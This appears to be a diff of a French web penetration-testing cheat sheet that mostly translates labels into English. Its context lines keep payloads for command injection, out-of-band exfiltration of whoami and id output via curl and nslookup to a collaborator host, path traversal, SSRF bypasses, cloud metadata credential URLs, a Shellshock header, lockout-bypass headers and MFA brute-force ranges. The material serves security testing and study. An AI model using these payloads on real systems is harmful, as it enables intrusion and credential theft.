 & echo <MARQUEUR> &
@@ -787,25 +915,25 @@ Pour contrôler, refaire avec cinq puis dix secondes : le temps doit suivre la v
 **Unix**
 
 ```bash
-# CMD-12 delai sleep
+# CMD-12 time-based sleep
 & sleep 10 &
-# CMD-13 delai ping unix
+# CMD-13 time-based ping unix
 & ping -c 10 127.0.0.1 &
 ```
 
 **Windows (cmd)**
 
 ```text
-# CMD-14 delai ping windows
+# CMD-14 time-based ping windows
 & ping -n 10 127.0.0.1 &
-# CMD-15 delai timeout
+# CMD-15 time-based timeout
 & timeout /t 10 &
 ```
 
 **Windows (PowerShell)**
 
 ```text
-# CMD-16 delai start-sleep
+# CMD-16 time-based start-sleep
 ; Start-Sleep 10;
 ```
 
@@ -850,29 +978,29 @@ Pour relever les interactions, voir [[#Outils Burp - Collaborator]].
 **Unix et Windows (cmd)**
 
 ```text
-# CMD-20 hors bande interaction dns
+# CMD-20 out-of-band interaction dns
 & nslookup <COLLAB> &
 ```
 
 **Unix**
 
 ```bash
-# CMD-21 hors bande exfiltration guillemets inverses
+# CMD-21 out-of-band exfiltration guillemets inverses
 & nslookup `whoami`.<COLLAB> &
-# CMD-21 hors bande exfiltration substitution
+# CMD-21 out-of-band exfiltration substitution
 & nslookup $(whoami).<COLLAB> &
-# CMD-23 hors bande http curl
+# CMD-23 out-of-band http curl
 & curl http://<COLLAB>/ &
-# CMD-23 hors bande http wget
+# CMD-23 out-of-band http wget
 & wget http://<COLLAB>/ &
-# CMD-24 hors bande http exfiltration
+# CMD-24 out-of-band http exfiltration
 & curl http://<COLLAB>/`id|base64 -w0` &
 ```
 
 **Windows (cmd)**
 
 ```text
-# CMD-22 hors bande exfiltration variable
+# CMD-22 out-of-band exfiltration variable
 & nslookup %USERNAME%.<COLLAB> &
 ```
 
@@ -946,20 +1074,20 @@ Dans les payloads, le paramètre s'écrit `<PARAM>=<valeur>` ; seule la valeur e
 **Unix**
 
 ```text
-# PTH-1 traversee simple unix
+# PTH-1 path traversal simple unix
 ../../../etc/passwd
-# PTH-2 traversee simple unix sequence en trop
+# PTH-2 path traversal simple unix sequence en trop
 ../../../../etc/passwd
 ```
 
 **Windows**
 
 ```text
-# PTH-3 traversee simple windows
+# PTH-3 path traversal simple windows
 ..\..\..\windows\win.ini
-# PTH-3 traversee windows antislash encode
+# PTH-3 path traversal windows antislash encode
 ..%5c..%5c..%5cwindows%5cwin.ini
-# PTH-3 traversee windows antislash double encodage
+# PTH-3 path traversal windows antislash double encodage
 ..%255c..%255c..%255cwindows%255cwin.ini
 ```
 
@@ -1142,7 +1270,7 @@ La liste Burp dédiée au path traversal est décrite dans [[#Outils Burp - Intr
 Note détaillée : [[File-upload]] ; fiches : [[File-upload-web-shell]], [[File-upload-validation-content-type]], [[File-upload-liste-noire]]
 
 **Quand l'utiliser** : l'application accepte un fichier de l'utilisateur et le range dans un répertoire où le serveur exécute les scripts.
-**Détection** : envoyer un fichier inoffensif par file upload, retrouver son adresse de service dans l'historique du proxy (filtre Images), puis voir si le dossier exécute les scripts.
+**Détection** : uploader un fichier inoffensif, retrouver son adresse de service dans l'historique du proxy (filtre Images), puis voir si le dossier exécute les scripts.
 
 ### File upload - Web shells
 
@@ -1150,7 +1278,7 @@ Note détaillée : [[File-upload]] ; fiches : [[File-upload-web-shell]], [[File-
 |---|---|---|---|
 | FUP-1 | Lecture d'un fichier précis | Contenu du fichier dans la réponse | Web shell PHP minimal |
 | FUP-2 | Exécution de commandes | Sortie de la commande dans la réponse | Web shell PHP polyvalent |
-| FUP-3 | Appel du fichier envoyé | La réponse contient la sortie du script, pas son code | Depuis Repeater, remplacer le nom du fichier de l'URL de service par celui du script ; un texte brut signifie que le dossier n'exécute pas |
+| FUP-3 | Appel du fichier uploadé | La réponse contient la sortie du script, pas son code | Depuis Repeater, remplacer le nom du fichier de l'URL de service par celui du script ; un texte brut signifie que le dossier n'exécute pas |
 
 **PHP**
 
@@ -1294,15 +1422,15 @@ http://127.0.0.1.nip.io/
 | SSR-23 | Divergence de décodage entre filtre et client | Acceptée une fois encodée, refusée en clair | Dépend du nombre de décodages |
 
 ```text
-# SSR-19 liste blanche arobase
+# SSR-19 allowlist arobase
 https://<HOTEATTENDU>@<HOTEEXTERNE>/
-# SSR-20 liste blanche identifiants
+# SSR-20 allowlist identifiants
 https://<HOTEATTENDU>:fakepassword@<HOTEEXTERNE>
-# SSR-21 liste blanche fragment
+# SSR-21 allowlist fragment
 https://<HOTEEXTERNE>#<HOTEATTENDU>
-# SSR-22 liste blanche sous-domaine
+# SSR-22 allowlist sous-domaine
 https://<HOTEATTENDU>.<HOTEEXTERNE>
-# SSR-23 liste blanche encodage arobase et dieze
+# SSR-23 allowlist encodage arobase et dieze
 http://localhost:80%2523@<HOTEATTENDU>/admin
 ```
 
@@ -1314,9 +1442,9 @@ http://localhost:80%2523@<HOTEATTENDU>/admin
 | SSR-25 | Test préalable de la redirection | Interaction ou header Location | Vérifie que la redirection mène vers un domaine externe |
 
 ```text
-# SSR-24 redirection ouverte vers hote interne
+# SSR-24 open redirect vers hote interne
 <PARAM>=/product/nextProduct?path=http://192.168.0.12:8080/admin
-# SSR-25 redirection ouverte test externe
+# SSR-25 open redirect test externe
 <CHEMIN>/redirect?url=http://<COLLAB>
 ```
 
@@ -1333,19 +1461,19 @@ http://localhost:80%2523@<HOTEATTENDU>/admin
 Un DNS seul sans requête HTTP peut indiquer un filtrage du HTTP sortant ou une simple validation préalable.
 
 ```text
-# SSR-26 aveugle referer
+# SSR-26 blind referer
 Referer: http://<COLLAB>
-# SSR-27 aveugle parametre url
+# SSR-27 blind parametre url
 <PARAM>=http://<COLLAB>/
-# SSR-28 aveugle en-tete host
+# SSR-28 blind header host
 Host: <COLLAB>
-# SSR-28 aveugle en-tete forwarded host
+# SSR-28 blind header forwarded host
 X-Forwarded-Host: <COLLAB>
-# SSR-29 aveugle referer interne
+# SSR-29 blind referer interne
 Referer: http://192.168.0.<N>:8080/
-# SSR-29 aveugle host interne
+# SSR-29 blind host interne
 Host: <HOTE>
-# SSR-30 aveugle charge dans user-agent
+# SSR-30 blind payload dans user-agent
 User-Agent: () { :; }; /usr/bin/nslookup $(whoami).<COLLAB>
 ```
 
@@ -1370,11 +1498,11 @@ http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # SSR-33 metadonnees google
 http://metadata.google.internal/computeMetadata/v1/
-# SSR-33 metadonnees google en-tete
+# SSR-33 metadonnees google header
 Metadata-Flavor: Google
 # SSR-34 metadonnees azure
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
-# SSR-34 metadonnees azure en-tete
+# SSR-34 metadonnees azure header
 Metadata: true
 # SSR-35 schema fichier
 file://
@@ -1614,15 +1742,15 @@ Passw0rd
 | AUT-11 | Compteur remis à zéro après un succès | Aucun blocage sur les essais | Alterner un identifiant valide et un candidat avec Pitchfork et une requête simultanée |
 
 ```text
-# AUT-9 blocage ip en-tete
+# AUT-9 blocage ip header
 X-Forwarded-For: <IP>
-# AUT-10 blocage ip en-tete
+# AUT-10 blocage ip header
 X-Real-IP: <IP>
-# AUT-10 blocage ip en-tete
+# AUT-10 blocage ip header
 X-Client-IP: <IP>
-# AUT-10 blocage ip en-tete
+# AUT-10 blocage ip header
 True-Client-IP: <IP>
-# AUT-10 blocage ip en-tete
+# AUT-10 blocage ip header
 Forwarded: for=<IP>
 # AUT-11 alternance compte valide
 username=<UTILISATEUR>&password=<VALEUR>
@@ -1642,13 +1770,13 @@ Pour AUT-9, un script qui change l'adresse à chaque requête figure dans [[#Out
 | AUT-17 | Génération faible du token | Tokens successifs proches | Demander plusieurs tokens et les comparer |
 
 ```text
-# AUT-12 reinitialisation en-tete host
+# AUT-12 reinitialisation header host
 X-Forwarded-Host: <COLLAB>
-# AUT-12 reinitialisation en-tete host
+# AUT-12 reinitialisation header host
 X-Forwarded-Server: <COLLAB>
-# AUT-12 reinitialisation en-tete host
+# AUT-12 reinitialisation header host
 X-Host: <COLLAB>
-# AUT-13 reinitialisation sans jeton
+# AUT-13 reinitialisation sans token
 supprimer temp-forgot-password-token de l'URL et du corps
 # AUT-15 changement mot de passe oracle
 username=<UTILISATEUR>&current-password=§x§&new-password-1=123&new-password-2=abc
@@ -1726,11 +1854,11 @@ Cookie: verify=<UTILISATEUR>
 | MFA-5 | La session est coupée après deux échecs | Idem | Macro de connexion et règle de gestion de session, avec une requête simultanée (voir l'annexe) |
 
 ```text
-# MFA-4 force brute code quatre chiffres
+# MFA-4 brute force code quatre chiffres
 0000-9999
-# MFA-4 force brute code six chiffres
+# MFA-4 brute force code six chiffres
 000000-999999
-# MFA-5 force brute parametre du code
+# MFA-5 brute force parametre du code
 mfa-code=§0000§
 ```
 
@@ -1813,4 +1941,4 @@ def handleResponse(req, interesting):
 | BRP-14 | Resource pool | Limiter à une requête simultanée | Délais mesurés, alternance de compte, macro de session |
 | BRP-15 | Macro | Rejouer les étapes de connexion avant chaque essai | Par exemple une requête GET de la page de connexion, un POST de connexion, un GET de la page du code |
 | BRP-16 | Règle de gestion de session | Lancer la macro avant chaque requête de l'attaque | Utile quand la session est coupée après quelques échecs |
-| BRP-17 | Filtre Images de l'historique du proxy | Retrouver l'adresse de service des fichiers envoyés | Onglet HTTP history du proxy |
+| BRP-17 | Filtre Images de l'historique du proxy | Retrouver l'adresse de service des fichiers uploadés | Onglet HTTP history du proxy |
